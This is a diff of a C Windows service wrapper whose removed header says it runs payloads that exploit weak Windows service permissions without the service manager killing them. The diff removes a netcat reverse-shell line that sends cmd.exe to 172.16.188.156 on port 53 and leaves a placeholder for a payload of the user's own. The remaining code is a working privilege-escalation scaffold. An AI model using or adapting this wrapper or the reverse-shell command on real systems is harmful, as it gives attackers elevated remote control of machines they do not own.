@@ -1,10 +1,3 @@
-/*
-	Service wrapper for running payloads exploting Windows services weak permissions without being terminated by the SCM.
-	All you need to do is modify the SERVICE_NAME macro and add your code to the payload function.
-	Note that depending on the target service, it might be necessary to add some control event processing to the service handler,
-	otherwise the SCM will not be happy.
-*/
-
 #include <windows.h>
 #include <lm.h>
 
@@ -12,7 +5,7 @@
 
 void WINAPI PwnedServiceCtrlHandler(DWORD opcode);
 void PwnedServiceStart(DWORD argc, LPTSTR *argv);
-DWORD InvokePayload();
+DWORD InvokePayload(); 
 
 SERVICE_STATUS PwnedServiceStatus;
 SERVICE_STATUS_HANDLE PwnedServiceStatusHandle;
@@ -55,7 +48,7 @@ void PwnedServiceStart(DWORD argc, LPTSTR *argv)
 		PwnedServiceStatus.dwWaitHint = 0;
 		SetServiceStatus(PwnedServiceStatusHandle, &PwnedServiceStatus);		
 	
-		InvokePayload();
+		InvokePayload(); // might need to be invoked as a separate thread
 		
 		
 		return;
@@ -82,7 +75,5 @@ void WINAPI PwnedServiceCtrlHandler(DWORD opcode){
 
 DWORD InvokePayload(){
 
-	 system("C:\\nc.exe -d 172.16.188.156 53 -e cmd.exe");
-
-	 return GetLastError();
+	// add your code here 
 }
